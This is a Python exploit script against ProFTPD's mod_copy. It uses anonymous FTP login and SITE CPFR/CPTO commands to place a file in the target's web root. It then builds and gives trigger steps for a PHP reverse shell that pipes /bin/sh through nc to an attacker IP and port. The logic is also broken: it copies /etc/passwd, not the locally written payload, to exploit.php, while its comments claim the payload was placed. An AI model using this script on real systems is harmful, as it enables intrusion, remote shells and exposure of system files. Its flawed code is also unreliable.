#!/usr/bin/env python3

import ftplib
import os

# -------- Configuration --------
TARGET_FTP_IP = "192.168.8.160"        # Target FTP server (ProFTPD with mod_copy enabled)
TARGET_WEB_PATH = "/var/www/html" # Web root where PHP file will be placed
ATTACKER_IP = "192.168.8.152"          # Attacker's machine IP (Kali)
ATTACKER_PORT = 4444              # Port to receive reverse shell
PHP_FILE_NAME = "exploit.php"     # Name of the uploaded payload
FTP_PORT = 21                     # Default FTP port

# -------- Reverse Shell Payload --------
reverse_shell_command = (
    f"rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | "
    f"nc {ATTACKER_IP} {ATTACKER_PORT} > /tmp/f"
)
php_payload = f'<?php system("{reverse_shell_command}"); ?>'

# Write payload to local PHP file
def create_payload(filename, content):
    with open(filename, 'w') as f:
        f.write(content)
    print(f"[+] Payload written to {filename}")

# Use FTP to exploit ProFTPD mod_copy
def upload_via_modcopy(target_ip, php_name, web_path):
    try:
        ftp = ftplib.FTP()
        ftp.connect(target_ip, FTP_PORT)
        ftp.login()  # Anonymous login
        print("[+] Connected to FTP server")

        source_file = "/etc/passwd"  # File to copy from (required by mod_copy)
        destination = f"{web_path}/{php_name}"

        # Trigger mod_copy exploit
        ftp.sendcmd(f"SITE CPFR {source_file}")
        ftp.sendcmd(f"SITE CPTO {destination}")
        ftp.quit()
        print(f"[+] Exploit complete, payload copied to: {destination}")
    except Exception as e:
        print(f"[-] FTP exploit failed: {e}")

# Inform user to start listener and trigger the payload
def instructions_to_trigger(ip, php_file, port):
    print("\n[!] Start listener with:")
    print(f"    nc -lvnp {port}")
    print("\n[+] Trigger the payload by visiting:")
    print(f"    http://{ip}/{php_file}")
    print(f"    or using: curl http://{ip}/{php_file}")

def main():
    print("[*] Generating reverse shell PHP payload...")
    create_payload(PHP_FILE_NAME, php_payload)

    print("[*] Exploiting ProFTPD mod_copy to place the payload...")
    upload_via_modcopy(TARGET_FTP_IP, PHP_FILE_NAME, TARGET_WEB_PATH)

    instructions_to_trigger(TARGET_FTP_IP, PHP_FILE_NAME, ATTACKER_PORT)

if __name__ == "__main__":
    main()
